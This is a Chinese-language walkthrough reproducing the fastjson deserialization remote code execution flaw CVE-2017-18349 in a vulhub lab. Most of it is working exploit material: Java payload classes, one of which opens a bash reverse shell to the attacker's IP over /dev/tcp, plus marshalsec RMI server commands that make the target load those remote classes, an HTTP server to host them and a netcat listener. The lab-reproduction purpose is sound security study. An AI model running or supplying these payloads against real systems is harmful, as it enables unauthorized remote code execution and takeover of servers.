> # CVE-2017-18349

# 0x00 漏洞概述
CVE-2017-18349，前台无回显RCE
fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。
​

# 0x01 影响范围
> fastjson<=1.2.24

​

# 0x02 漏洞分析

- [漏洞原理分析](https://www.dazhuanlan.com/alfie-momo/topics/994245)
# 0x03 环境搭建
靶机 vulhub：192.168.198.134
攻击机 kali：192.168.198.136
# 0x04 漏洞复现
## 4.1 创建文件
### 1、访问网站
靶机网页，出现json格式数据

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637769870459-6a12d565-239f-4ff3-a63c-2864dba482db.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=211&id=ua5d0a75a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=494&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22175&status=done&style=none&taskId=ua0910123-7170-45f0-9863-a6a18dad4e4&title=&width=494)


### 2、创建恶意java文件 -> class文件
在kali上新建一个TouchFile.java，文件内容如下：
```bash
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing

        }

    }
}
```
将TouchFile.java编译成class文件
`javac TouchFile.java`
​

使用python开启站点：
`python3 -m http.server 8888`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637770059341-34ae9685-4459-4664-9264-0d399ff926d3.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=66&id=udc37eda9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=66&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28544&status=done&style=none&taskId=uadc082df-bfa4-4e17-a70f-afddef70a0b&title=&width=509)


### 3、编译使用java反序列化工具marshalsec
然后借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class：（marshalsec-0.0.3-SNAPSHOT-all.jar需要下载，编译，特别坑）
安装mvn
```bash
1、下载mvn
wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz

2、解压安装
tar -zxvf apache-maven-3.5.4-bin.tar.gz

3、版本控制
update-alternatives --install /usr/bin/mvn mvn /opt/apache-maven-3.5.4/bin/mvn 1

4、在/etc/profile中配置maven环境变量
这里路径写/opt/apache-maven-3.5.4，就是maven安装路径。

# maven
export MAVEN_HOME=/opt/apache-maven-3.5.4
export PATH=$PATH:$MAVEN_HOME/bin

5、使配置生效
source /etc/profile

进入环境后查看mvn版本，出现以下界面则maven成功安装。

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637770914815-e0f0101e-a18c-4bd6-a7a6-7c219b7f10e6.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=117&id=ubf586b7f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=117&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69274&status=done&style=none&taskId=u8ca34e23-f453-4bff-b3e2-2b47ce2ade0&title=&width=554)


安装marshalsec
```bash
git clone https://github.com/mbechler/marshalsec.git

cd marshalsec/

# 进入mvn环境
source /etc/profile

mvn clean package -DskipTests
```
​

当查看到绿色的SUCCESS时，即可成功编译好marshalsec的jar包：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637771398769-b60c445a-3738-438f-a467-ba384de03e6a.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=166&id=uc25b5049&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=1067&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35185&status=done&style=none&taskId=u8721354a-6d9a-4f6e-96e7-444be052811&title=&width=1067)


[java 反序列化利用工具 marshalsec 使用简介](https://blog.csdn.net/whatday/article/details/107942941)


然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类TouchFile.class：
```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击方ip:8888/#TouchFile" 9999

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637772775255-f37bd4d8-3834-48c5-8266-38b59454aab2.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=71&id=u4fe2201a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=71&originWidth=1302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21422&status=done&style=none&taskId=u773ee254-8aec-478c-9b07-9ab944e9330&title=&width=1302)


### 4、burp传恶意json数据
### ​

重新访问页面，抓包修改请求为POST，上传恶意json文件。


![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637773657854-d18f1bf6-4185-4df3-b007-a88d925b3a90.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=467&id=uf4b6bc9f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=467&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71696&status=done&style=none&taskId=u8d676298-f77a-4b45-a73c-89faab04ce0&title=&width=948)


进入靶机查看结果：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637775119618-5e64f0ff-5bd0-4e42-808c-98a6371fe608.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=137&id=uccd58c6d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=137&originWidth=898&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43321&status=done&style=none&taskId=u4ec006a2-ad02-4b36-b222-f0e5f285bbe&title=&width=898)


## 4.2 反弹shell
参考链接：

- [fastjson反弹shell](https://blog.csdn.net/guo15890025019/article/details/120532891)​
### 1、制作反弹shell的java文件 -> class文件
**ReverseShell.java 如下：**
```bash
import java.lang.Runtime;
import java.lang.Process;

public class ReverseShell {
 static {
     try {
         Runtime rt = Runtime.getRuntime();
         String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.198.136/4444 0>&1"};
         Process pc = rt.exec(commands);
         pc.waitFor();
     } catch (Exception e) {
    		 // do nothing
         
     }	 
 }
}

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637775760464-e4839c65-cebb-4ed5-a627-fe0684fa0fcb.png#clientId=u3ffa8ee0-3db9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=338&id=u30b17881&margin=%5Bobject%20Object%5D&name=image.png&originHeight=338&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60494&status=done&style=none&taskId=u4dc37cc4-57af-416a-90c0-f7f81750567&title=&width=890)


生成class文件：
`javac ReverseShell.java`
​

### 2、python3开启http服务
ReverseShell.class文件所在处开启http服务
`python3 -m http.server 8888`


### 3、kali开启监听
`nc -lvvp 4444`
​

### 4、使用marshalsec
marshalsec使用RMI利用模块：
```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击方ip:8888/#ReverseShell" 9998
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637776787421-137b1de3-6946-480b-a770-948acf58808a.png#clientId=u65a0c547-5c1c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=79&id=ud144309f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=79&originWidth=1319&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30979&status=done&style=none&taskId=u2b7880e8-760e-4242-897b-1d0342c0b59&title=&width=1319)


### 5、burp传恶意json数据
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637777365751-4ca18472-1d4a-4426-b4fc-7b850368e01a.png#clientId=u65a0c547-5c1c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=361&id=u2540c725&margin=%5Bobject%20Object%5D&name=image.png&originHeight=361&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35040&status=done&style=none&taskId=u1f0374b2-9fda-43a2-857d-987eb4b2f42&title=&width=585)


### 6、kali收到shell
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637777422254-dc31f33b-876f-4da4-a539-da7273f9d247.png#clientId=u65a0c547-5c1c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=427&id=u2f2d0a8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=427&originWidth=768&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79070&status=done&style=none&taskId=ub47c7fca-a47d-40fd-b329-410036229a8&title=&width=768)






